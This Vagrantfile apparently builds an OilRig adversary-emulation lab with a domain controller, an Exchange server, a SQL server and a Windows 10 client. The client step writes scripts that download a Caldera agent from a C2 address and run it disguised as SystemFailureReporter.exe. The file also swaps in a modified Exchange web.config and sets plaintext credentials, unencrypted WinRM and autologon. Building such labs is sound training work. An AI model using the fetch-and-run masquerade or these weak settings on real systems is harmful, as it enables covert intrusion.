Vagrant.configure("2") do |config|

  # =================================================================
  # PLUGIN CHECK AND INSTALLATION (vbguest and reload)
  # =================================================================
  config.vagrant.plugins = ["vagrant-vbguest", "vagrant-reload", "vagrant-vmware-desktop"]
  #config.vagrant.plugins = ["vagrant-reload", "vagrant-vmware-desktop"]

  config.vm.box = "windows-server-2019"
  config.vm.guest = :windows
  config.vm.communicator = "winrm"
  config.vm.boot_timeout = 3600
  config.vm.graceful_halt_timeout = 3600
  
  config.winrm.transport = :plaintext
  config.winrm.basic_auth_only = true
  
  config.winrm.username = "vagrant"
  config.winrm.password = "vagrant"
  config.winrm.timeout = 3600
  config.winrm.retry_limit = 60
  config.winrm.retry_delay = 10
  
  config.vm.synced_folder ".", "/vagrant", disabled: true
  config.vbguest.auto_update = true
  #config.vbguest.auto_update = false
    

  # =================================================================
  # DOMAIN CONTROLLER - diskjockey
  # =================================================================
  config.vm.define "diskjockey" do |dc|
    dc.vm.hostname = "diskjockey"
       
    # =====================================================================
    # VIRTUALBOX PROVIDER
    # =====================================================================
    dc.vm.provider "virtualbox" do |vb, override|
      vb.name = "diskjockey"
      vb.memory = 2048
      vb.cpus = 1
      vb.linked_clone = false
      vb.customize ["modifyvm", :id, "--vram", "128"]
      vb.customize ["modifyvm", :id, "--clipboard", "bidirectional"]
      vb.customize ["modifyvm", :id, "--audio", "none"]

      # Override network configuration only for VirtualBox creating a private network

      override.vm.network "private_network",
        virtualbox__intnet: "intnet-target",
        adapter: "2",
        auto_config: false

    end
    
    # =====================================================================
    # VMWARE PROVIDER
    # =====================================================================
    dc.vm.provider "vmware_desktop" do |v|
      v.vmx["displayName"] = "diskjockey"
      v.memory = 2048
      v.cpus = 1
      v.gui = true
      v.allowlist_verified = true
      
      v.force_vmware_license = "workstation"
      
      v.vmx["isolation.tools.guestDhcp.enabled"] = "TRUE"

      # Network configuration for VMware
      v.vmx["ethernet0.virtualDev"] = "e1000"
      v.vmx["ethernet0.connectionType"] = "nat"
      v.vmx["ethernet0.present"] = "TRUE"
      v.vmx["ethernet0.pciSlotNumber"] = "33"
      #v.vmx["ethernet0.addressType"] = "generated"
      v.vmx["ethernet1.present"] = "TRUE"
      v.vmx["ethernet1.connectionType"] = "pvn"
      v.vmx["ethernet1.pvnID"] = "52 3d 44 e8 0e 9a 0b ca-29 7a 57 3c 4f 95 14 89" # Place your ID here in the preferences.ini file or vmx
      v.vmx["ethernet1.virtualDev"] = "e1000"
      v.vmx["ethernet1.addressType"] = "generated"
    end
    
    # =====================================================================
    # PROVISIONING
    # =====================================================================      
        
    dc.vm.provision "provision-dc", type: "shell", path: "scripts/provision-dc.ps1", privileged: true
    dc.vm.provision "reload"
    dc.vm.provision "creation-users", type: "shell", path: "scripts/creation-users.ps1", privileged: true
    
    dc.vm.provision "time-zone", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
     
     # We set the time zone, change accordingly
      
     tzutil /s "Romance Standard Time"
             
    POWERSHELL

    dc.vm.provision "set-gateway", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
     
     # Configure second network adapter since first one is the Vagrant one
     Write-Host "Configuring default Gateway..." -ForegroundColor Cyan
     # Including naming network interfaces convention from Virtualbox or Vmware respectively
     $adapter = Get-NetAdapter | Where-Object {$_.Name -eq "Ethernet 2" -or $_.Name -eq "Ethernet1" }  
     if ($adapter) {
        Write-Host "Network adapter found: $($adapter.Name)" -ForegroundColor Green
        New-NetRoute -DestinationPrefix "0.0.0.0/0" -InterfaceIndex $adapter.ifIndex -NextHop "10.1.0.1" -Confirm:$false
    
    }     
             
    POWERSHELL

    dc.vm.provision "reload"


    
  end
  
  # =================================================================
  # EXCHANGE SERVER - waterfalls
  # =================================================================
  config.vm.define "waterfalls" do |exch|
    exch.vm.hostname = "waterfalls"
    
    # =====================================================================
    # VIRTUALBOX PROVIDER
    # =====================================================================
    exch.vm.provider "virtualbox" do |vb, override|
      vb.name = "waterfalls"
      vb.memory = 10240
      vb.cpus = 2
      vb.linked_clone = false
      vb.customize ["modifyvm", :id, "--vram", "128"]
      vb.customize ["modifyvm", :id, "--clipboard", "bidirectional"]
      vb.customize ["modifyvm", :id, "--audio", "none"]
      vb.customize ["storageattach", :id, "--storagectl", "IDE Controller", "--port", "1", "--device", "0", "--type", "dvddrive", "--medium", "isos/ExchangeServer2019-x64-CU11.ISO"]
      vb.customize ["storageattach", :id, "--storagectl", "IDE Controller", "--port", "1", "--device", "1", "--type", "dvddrive", "--medium", "isos/SQLServer2019-x64-ENU.iso"]

      override.vm.network "private_network",
      virtualbox__intnet: "intnet-target",
      adapter: "2",
      auto_config: false
    end
    
    # =====================================================================
    # VMWARE PROVIDER
    # =====================================================================
    exch.vm.provider "vmware_desktop" do |v|
      v.vmx["displayName"] = "waterfalls"
      v.memory = 10240
      v.cpus = 2
      v.gui = true
      v.allowlist_verified = true

      v.force_vmware_license = "workstation"
      
      v.vmx["isolation.tools.guestDhcp.enabled"] = "TRUE"
      
      # Network configuration for VMware
      v.vmx["ethernet0.virtualDev"] = "e1000"
      v.vmx["ethernet0.connectionType"] = "nat"
      v.vmx["ethernet0.present"] = "TRUE"
      v.vmx["ethernet0.pciSlotNumber"] = "33"
      v.vmx["ethernet0.addressType"] = "generated"
      v.vmx["ethernet1.present"] = "TRUE"
      v.vmx["ethernet1.connectionType"] = "pvn"
      v.vmx["ethernet1.pvnID"] = "52 3d 44 e8 0e 9a 0b ca-29 7a 57 3c 4f 95 14 89" # Place your ID here in the preferences.ini file or vmx
      v.vmx["ethernet1.virtualDev"] = "e1000"
      v.vmx["ethernet1.addressType"] = "generated"

      # Dynamically get the absolute path relative to this Vagrantfile
      iso_exchange_path = File.expand_path("isos/ExchangeServer2019-x64-CU11.iso", __dir__)
    
      # Convert forward slashes into backslashes in case you use Windows
      #iso_exchange_path = iso_exchange_path.gsub('/', '\\')      


      # Dynamically get the absolute path relative to this Vagrantfile
      iso_sql_path = File.expand_path("isos/SQLServer2019-x64-ENU.iso", __dir__)
    
      # Convert forward slashes into backslashes in case you use Windows
      #iso_sql_path = iso_sql_path.gsub('/', '\\')


      # ISO mounting for Exchange Server
      v.vmx["ide0:0.present"] = "TRUE"
      v.vmx["ide0:0.fileName"] = iso_exchange_path
      v.vmx["ide0:0.deviceType"] = "cdrom-image"
      v.vmx["ide0:0.startConnected"] = "TRUE"
  
           
      # ISO mounting for SQL Server
      v.vmx["ide0:1.present"] = "TRUE"
      v.vmx["ide0:1.fileName"] = iso_sql_path
      v.vmx["ide0:1.deviceType"] = "cdrom-image"
      v.vmx["ide0:1.startConnected"] = "TRUE"
    end
    
    # =====================================================================
    # PROVISIONING
    # =====================================================================

    exch.vm.provision "join-domain", type: "shell", path: "scripts/provision-waterfalls-join-domain.ps1", privileged: true
    
    exch.vm.provision "reload"
    
    exch.vm.provision "prerequisites-exchange", type: "shell", path: "scripts/provision-waterfalls-prerequisites-exchange.ps1", privileged: true
    
    exch.vm.provision "sql-install", type: "shell", path: "scripts/provision-waterfalls-sql.ps1", privileged: true
    
    exch.vm.provision "reload"
     
    exch.vm.provision "administrator-configuration", type: "shell", path: "scripts/provision-waterfalls-administrator-configuration.ps1", privileged: true
    
    exch.vm.provision "file", source: "scripts/provision-waterfalls-exchange.ps1", destination: "C:\\tmp\\provision-waterfalls-exchange.ps1"
    
    exch.vm.provision "reload"
    
    exch.vm.provision "file", source: "web.config", destination: "C:\\tmp\\web.config"
    
    exch.vm.provision "autologon", type: "shell", privileged: "true", inline: <<-'POWERSHELL'
    
      $Domain = "boombox.com"
      $User = "Administrator@boombox.com"
      $Password = "vagrant"
      
      Write-Host "Setting up Default credentials for installing Exchange after reboot..." -ForegroundColor Cyan
             
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name AutoAdminLogon -Value "1" 
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefaultUserName -Value "$User" 
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefaultPassword -Value $Password
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefautDomainName -value $Domain  
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name AutoLogonCount -Value "1" 
      
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -Name ScriptLogon -Value "powershell.exe -ExecutionPolicy Bypass -File C:\tmp\provision-waterfalls-exchange.ps1"         
      
    POWERSHELL
    
    exch.vm.provision "reload"
    
    exch.vm.provision "remove-autologon", type: "shell", privileged: "true", inline: <<-'POWERSHELL'       
      
      # We back up file in Exchange configuration once is created
      $file = "C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\web.config"
      $backup = "C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\web.config.bkp"
      
      Write-Host "Waiting for Exchange being installed..." -ForegroundColor Cyan
      
      while (-not (Test-Path -Path $file)) {
          Start-Sleep -s 60
      }
      
      Write-Host "Modifying web.config configuration file of Exchange..." -ForegroundColor Cyan

      Copy-Item $file -Destination $backup
      
      # We update web.config configuration with the entry <add assembly="Microsoft.Exchange.Diagnostics" ...
      Copy-Item "C:\tmp\web.config" -Destination $file
      
      # We disable autologon 
      
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name AutoAdminLogon -Value "0"   
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefaultUserName -Value "" 
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefaultPassword -Value ""
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefautDomainName -value ""             
      
      # We wait until the Exchange installation might have finished at least 2 hours (30 minutes first Start-Sleep + 150 minutes second Start-Sleep )
      Start-Sleep -s 5400 
       
    POWERSHELL
    
    exch.vm.provision "create-mailboxes", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
      
     $DomainServer = "diskjockey.boombox.com" 
     $ExchangeServer = "waterfalls"
     $DomainAdmin = "BOOMBOX\Administrator"
     $DomainPassword = "vagrant"
     
     # We set the time zone, change accordingly
      
     Write-Host "Enabling gosta mailbox..." -ForegroundColor Cyan

     # Convert the plain text password to a SecureString object
     $secpasswd = ConvertTo-SecureString $DomainPassword -AsPlainText -Force

     # Create a PSCredential object
     $cred = New-Object System.Management.Automation.PSCredential($DomainAdmin, $secpasswd)

     # Define the Exchange server connection URI

     $SessionUri = "http://$ExchangeServer/powershell" 

     # Create a new PSSession with the specified credentials and configuration
     $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $SessionUri -Credential $cred -Authentication Kerberos 

     # Import the cmdlets from the remote session into your local PowerShell session
     Import-PSSession $Session -DisableNameChecking

     # We Enable-Mailbox for gosta user

     Enable-Mailbox -Identity "gosta@boombox.com" -domainController $DomainServer
     
     Test-MapiConnectivity -Identity "gosta@boombox.com"
     
     # We close the session
     Remove-PSSession $Session
             
    POWERSHELL
    
    exch.vm.provision "time-zone", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
     
     # We set the time zone, change accordingly
      
     tzutil /s "Romance Standard Time"
             
    POWERSHELL

    exch.vm.provision "set-gateway", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
     
     # Configure second network adapter since first one is the Vagrant one
     Write-Host "Configuring default Gateway..." -ForegroundColor Cyan
     # Including naming network interfaces convention from Virtualbox or Vmware respectively
     $adapter = Get-NetAdapter | Where-Object {$_.Name -eq "Ethernet 2" -or $_.Name -eq "Ethernet1" }  
     if ($adapter) {
        Write-Host "Network adapter found: $($adapter.Name)" -ForegroundColor Green
        New-NetRoute -DestinationPrefix "0.0.0.0/0" -InterfaceIndex $adapter.ifIndex -NextHop "10.1.0.1" -Confirm:$false
    
    }     
             
    POWERSHELL

    exch.vm.provision "reload"
    


  end

  # =================================================================
  # SQL SERVER - endofroad
  # =================================================================
  config.vm.define "endofroad" do |sql|
    sql.vm.hostname = "endofroad"
    
    
    # =====================================================================
    # VIRTUALBOX PROVIDER
    # =====================================================================
    sql.vm.provider "virtualbox" do |vb, override|
      vb.name = "endofroad"
      vb.memory = 4096
      vb.cpus = 1
      vb.linked_clone = false
      vb.customize ["modifyvm", :id, "--vram", "128"]
      vb.customize ["modifyvm", :id, "--clipboard", "bidirectional"]
      vb.customize ["modifyvm", :id, "--audio", "none"]
      vb.customize ["storageattach", :id, "--storagectl", "IDE Controller", "--port", "1", "--device", "0", "--type", "dvddrive", "--medium", "isos/SQLServer2019-x64-ENU.iso"]

      # Override network configuration only for VirtualBox creating a private network
      override.vm.network "private_network",
        virtualbox__intnet: "intnet-target",
        adapter: "2",
        auto_config: false
    end
    
    # =====================================================================
    # VMWARE PROVIDER
    # =====================================================================
    sql.vm.provider "vmware_desktop" do |v|
      v.vmx["displayName"] = "endofroad"
      v.memory = 4096
      v.cpus = 1
      v.gui = true
      v.allowlist_verified = true

      v.force_vmware_license = "workstation"
      
      v.vmx["isolation.tools.guestDhcp.enabled"] = "TRUE"
      
      # Network configuration for VMware
      v.vmx["ethernet0.virtualDev"] = "e1000"
      v.vmx["ethernet0.connectionType"] = "nat"
      v.vmx["ethernet0.present"] = "TRUE"
      v.vmx["ethernet0.pciSlotNumber"] = "33"
      v.vmx["ethernet0.addressType"] = "generated"
      v.vmx["ethernet1.present"] = "TRUE"
      v.vmx["ethernet1.connectionType"] = "pvn"
      v.vmx["ethernet1.pvnID"] = "52 3d 44 e8 0e 9a 0b ca-29 7a 57 3c 4f 95 14 89" # Place your ID here in the preferences.ini file or vmx
      v.vmx["ethernet1.virtualDev"] = "e1000"
      v.vmx["ethernet1.addressType"] = "generated"

      # Dynamically get the absolute path relative to this Vagrantfile
      iso_sql_path = File.expand_path("isos/SQLServer2019-x64-ENU.iso", __dir__)
    
      # Convert forward slashes into backslashes in case you use Windows
      #iso_sql_path = iso_sql_path.gsub('/', '\\')

      v.vmx["ide0:0.present"] = "TRUE"
      v.vmx["ide0:0.fileName"] = iso_sql_path
      v.vmx["ide0:0.deviceType"] = "cdrom-image"
      v.vmx["ide0:0.startConnected"] = "TRUE"
    end
    
    # =====================================================================
    # PROVISIONING
    # =====================================================================
     
    sql.vm.provision "provision-join", type: "shell", path: "scripts/provision-endofroad-join-domain.ps1", privileged: true
    
    sql.vm.provision "reload"
    
    sql.vm.provision "provision-sql", type: "shell", path: "scripts/provision-endofroad-sql.ps1", privileged: true
    
    sql.vm.provision "reload"
    
    sql.vm.provision "configure-sql", type: "shell", path: "scripts/configure-endofroad-sql.ps1", privileged: true
    
    sql.vm.provision "reload"
    
    sql.vm.provision "file", source: "minfac.csv", destination: "C:\\tmp\\minfac.csv"
    
    sql.vm.provision "provision-db", type: "shell", path: "scripts/provision-db-endofroad-sql.ps1", privileged: true 

    sql.vm.provision "file", source: "guest.bmp", destination: "C:\\tmp\\guest.bmp"
    
    sql.vm.provision "create-guest-bmp", type: "shell", privileged: "true", inline: <<-'POWERSHELL'
    
      # In case we are running Windows Server without GUI we are missing the guest.bmp under C:\ProgramData\Microsoft\User Account Pictures\guest.bmp  
          
    	# Define paths
    	$destination = "C:\ProgramData\Microsoft\User Account Pictures\guest.bmp"
    	$source = "C:\tmp\guest.bmp"
    
    	# Ensure the source file actually exists before we try to copy it
    	if (Test-Path $source) {
    	    
    	    # Check if the destination already exists; if so, delete it
    	    if (Test-Path $destination) {
    		Write-Host "Found existing guest.bmp at destination. Removing it..." -ForegroundColor Cyan
    		Remove-Item -Path $destination -Force
    	    }
    	    # Perform the copy
    	    Write-Host "Copying $source to $destination" -ForegroundColor Cyan
    	    
    	    if (-not (Test-Path "C:\ProgramData\Microsoft\User Account Pictures")) {
     		New-Item -Path "C:\ProgramData\Microsoft\User Account Pictures" -ItemType Directory -Force
    	    }
    	    Copy-Item -Path $source -Destination $destination -Force
    	    Write-Host "Copy complete!" -ForegroundColor Green
    	}      

    POWERSHELL

    sql.vm.provision "set-gateway", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
     
     # Configure second network adapter since first one is the Vagrant one
     Write-Host "Configuring default Gateway..." -ForegroundColor Cyan
     # Including naming network interfaces convention from Virtualbox or Vmware respectively
     $adapter = Get-NetAdapter | Where-Object {$_.Name -eq "Ethernet 2" -or $_.Name -eq "Ethernet1" }  
     if ($adapter) {
        Write-Host "Network adapter found: $($adapter.Name)" -ForegroundColor Green
        New-NetRoute -DestinationPrefix "0.0.0.0/0" -InterfaceIndex $adapter.ifIndex -NextHop "10.1.0.1" -Confirm:$false
    
    }     
             
    POWERSHELL

    sql.vm.provision "reload"
    
    sql.vm.provision "time-zone", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
     
     # We set the time zone, change accordingly
      
     tzutil /s "Romance Standard Time"
             
    POWERSHELL

    
  end
  
  # =================================================================
  # WINDOWS 10 LTSC CLIENT - theblock
  # =================================================================
  config.vm.define "theblock" do |client|
    client.vm.box = "windows-10-ltsc-17763"
    client.vm.hostname = "theblock"
    client.vm.guest = :windows
    #client.vbguest.auto_update = true
    

    # =====================================================================
    # VIRTUALBOX PROVIDER
    # =====================================================================
    client.vm.provider "virtualbox" do |vb, override|
      vb.name = "theblock"
      vb.memory = 4096
      vb.cpus = 2
      vb.linked_clone = false
      vb.customize ["modifyvm", :id, "--vram", "128"]
      vb.customize ["modifyvm", :id, "--clipboard", "bidirectional"]
      vb.customize ["modifyvm", :id, "--audio", "none"]

      override.vm.network "private_network",
        virtualbox__intnet: "intnet-target",
        adapter: "2",
        auto_config: false
    end
    
    # =====================================================================
    # VMWARE PROVIDER
    # =====================================================================
    client.vm.provider "vmware_desktop" do |v|
      v.vmx["displayName"] = "theblock"
      v.memory = 4096
      v.cpus = 2
      v.gui = true
      v.allowlist_verified = true

      v.force_vmware_license = "workstation"
      
      v.vmx["isolation.tools.guestDhcp.enabled"] = "TRUE"
      
      # Network configuration for VMware
      v.vmx["ethernet0.virtualDev"] = "e1000"
      v.vmx["ethernet0.connectionType"] = "nat"
      v.vmx["ethernet0.present"] = "TRUE"
      v.vmx["ethernet0.pciSlotNumber"] = "33"
      v.vmx["ethernet0.addressType"] = "generated"
      v.vmx["ethernet1.present"] = "TRUE"
      v.vmx["ethernet1.connectionType"] = "pvn"
      v.vmx["ethernet1.pvnID"] = "52 3d 44 e8 0e 9a 0b ca-29 7a 57 3c 4f 95 14 89" # Place your ID here in the preferences.ini file or vmx
      v.vmx["ethernet1.virtualDev"] = "e1000"
      v.vmx["ethernet1.addressType"] = "generated"
    end
    
    # =====================================================================
    # PROVISIONING
    # =====================================================================
 
    client.vm.provision "join-domain", type: "shell", path: "scripts/provision-theblock-join-domain.ps1", privileged: true
    
    client.vm.provision "reload"

    client.vm.provision "configure-rdp", type: "shell", privileged: "true", inline: <<-'POWERSHELL'           
    
      # gosta user hasn´t logged in yet. So We add to the Default user the registry for Default Terminal Server Client searched in the Oilrig Operation
            
    	$userName = "gosta"
    	$domain = "BOOMBOX"
    	$fullAccount = "$domain\$userName"
    
    	# Get Gosta User's SID
    	try {
    	    $sid = (New-Object System.Security.Principal.NTAccount($fullAccount)).Translate([System.Security.Principal.SecurityIdentifier]).Value
    	    Write-Host "Target SID identified: $sid" -ForegroundColor Cyan
    	} catch {
    	    Write-Warning "Could not find SID for $fullAccount. This is fine if the user has never logged in."
    	}
    
    	# Forcefully Delete Existing gosta Profile (if it exists)
    	if ($sid) {
    	    $existingProfile = Get-CimInstance -Class Win32_UserProfile | Where-Object { $_.SID -eq $sid }
    	    
    	    if ($existingProfile) {
    		Write-Host "Existing profile found for $fullAccount. Deleting..." -ForegroundColor Yellow
    		# This removes the folder AND the registry entry in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
    		Remove-CimInstance -InputObject $existingProfile
    		Write-Host "Profile wiped successfully." -ForegroundColor Green
    	    } else {
    		Write-Host "No existing profile found for $userName. Proceeding to template modification."
    	    }
    	}
            
        	# Path to the Default User's registry hive
    	$defaultHivePath = "C:\Users\Default\NTUSER.DAT"
    
    	# Check if the file exists (it's hidden/system, but Test-Path handles it)
    	if (-not (Test-Path $defaultHivePath)) {
    	    Write-Error "Default NTUSER.DAT not found."
    	    return
    	}
    
    	Write-Host "Loading Default User Hive..." -ForegroundColor Cyan
    
    	# Mount the hive into HKEY_USERS under a temporary name 'DefaultTemplate'
    	# Using 'reg.exe' is the most reliable way to handle the mount
    	reg load "HKU\DefaultTemplate" $defaultHivePath
    
    	try {
    	    # Define the target path within the mounted hive
    	    $targetPath = "Registry::HKEY_USERS\DefaultTemplate\SOFTWARE\Microsoft\Terminal Server Client\Default"
    
    	    # Create the key if it doesn't exist
    	    if (-not (Test-Path $targetPath)) {
    		Write-Host "Creating key in Default User profile..."
    		New-Item -Path $targetPath -Force | Out-Null
    		Write-Host "Successfully added key to template." -ForegroundColor Green
    	    } else {
    		Write-Host "Key already exists in the template." -ForegroundColor Yellow
    	    }
    	}
    	catch {
    	    Write-Error "An error occurred: $($_.Exception.Message)"
    	}
    	finally {
    	    # Crucial: Release the file lock and unload
    	    # We call the Garbage Collector to ensure PowerShell has dropped the handle
    	    [gc]::Collect()
    	    [gc]::WaitForPendingFinalizers()
    	    
    	    Write-Host "Unloading Default User Hive..." -ForegroundColor Cyan
    	    reg unload "HKU\DefaultTemplate"
    	}   
       
    POWERSHELL
    
    client.vm.provision "provision-theblock", type: "shell", path: "scripts/provision-theblock-provision.ps1", privileged: true

    client.vm.provision "caldera-scripts", type: "shell", inline: <<-'POWERSHELL'
    $TargetFile1 = "C:\Users\Default\Desktop\caldera\download_agent.ps1"
	    
    $ScriptContent1 = @'
    $server = "http://192.168.0.4:8888" # Adjusted to your lab network IP layout (change if C2 is elsewhere)
    $url = "$server/file/download"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.add("platform","windows")
    $wc.Headers.add("file","sandcat.go")
    $data = $wc.DownloadData($url)

    # Kill the masqueraded process if it's already running from a previous test execution
    Get-Process | Where-Object { $_.Modules.FileName -like "C:\Users\Public\SystemFailureReporter.exe" } | Stop-Process -Force -ErrorAction SilentlyContinue

    Remove-Item -Force "C:\Users\Public\SystemFailureReporter.exe" -ErrorAction Ignore
    [System.IO.File]::WriteAllBytes("C:\Users\Public\SystemFailureReporter.exe", $data)
'@

    $TargetFile2 = "C:\Users\Default\Desktop\caldera\start_agent.ps1"
	    
    $ScriptContent2 = @'
    $server = "http://192.168.0.4:8888" # Adjusted to your lab network IP layout (change if C2 is elsewhere)
    $url = "$server/file/download"
    Start-Process -FilePath C:\Users\Public\SystemFailureReporter.exe -ArgumentList "-server $server -group gosta -v";
'@
   $TargetFile3 = "C:\Users\Default\Desktop\caldera\start_agent.bat"
	    
    $ScriptContent3 = @'
    @echo off
    if not exist "%UserProfile%\AppData\Local\SystemFailureReporter" mkdir %UserProfile%\AppData\Local\SystemFailureReporter
    cd  %UserProfile%\AppData\Local\SystemFailureReporter
    powershell -executionpolicy Bypass %UserProfile%\Desktop\caldera\download_agent.ps1
    powershell -executionpolicy Bypass %UserProfile%\Desktop\caldera\start_agent.ps1
'@

    # Create directory path if the user profile hasn't fully initialized yet
    $TargetDir = Split-Path $TargetFile1
    if (!(Test-Path $TargetDir)) {
		New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
    }


    Set-Content -Path $TargetFile1 -Value $ScriptContent1 -Force
    Write-Host "Successfully created download_agent.ps1 on the Desktop." -ForegroundColor Green
 
    Set-Content -Path $TargetFile2 -Value $ScriptContent2 -Force
    Write-Host "Successfully created start_agent.ps1 on the Desktop." -ForegroundColor Green
    
    Set-Content -Path $TargetFile3 -Value $ScriptContent3 -Force
    Write-Host "Successfully created start_agent.bat on the Desktop." -ForegroundColor Green
    POWERSHELL
    
    client.vm.provision "time-zone", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
     
     # We set the time zone, change accordingly
      
     tzutil /s "Romance Standard Time"
             
    POWERSHELL

    client.vm.provision "set-gateway", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
     
     # Configure second network adapter since first one is the Vagrant one
     Write-Host "Configuring default Gateway..." -ForegroundColor Cyan
     # Including naming network interfaces convention from Virtualbox or Vmware respectively
     $adapter = Get-NetAdapter | Where-Object {$_.Name -eq "Ethernet 2" -or $_.Name -eq "Ethernet1" }  
     if ($adapter) {
        Write-Host "Network adapter found: $($adapter.Name)" -ForegroundColor Green
        New-NetRoute -DestinationPrefix "0.0.0.0/0" -InterfaceIndex $adapter.ifIndex -NextHop "10.1.0.1" -Confirm:$false
    
    }     
             
    POWERSHELL

    client.vm.provision "remove-autologon", type: "shell", privileged: "true", inline: <<-'POWERSHELL'       
      
      # We disable autologon 
      
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name AutoAdminLogon -Value "0"   
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefaultUserName -Value "" 
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefaultPassword -Value ""
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefautDomainName -value ""             
       
    POWERSHELL

    client.vm.provision "reload"
    
  end
  
end
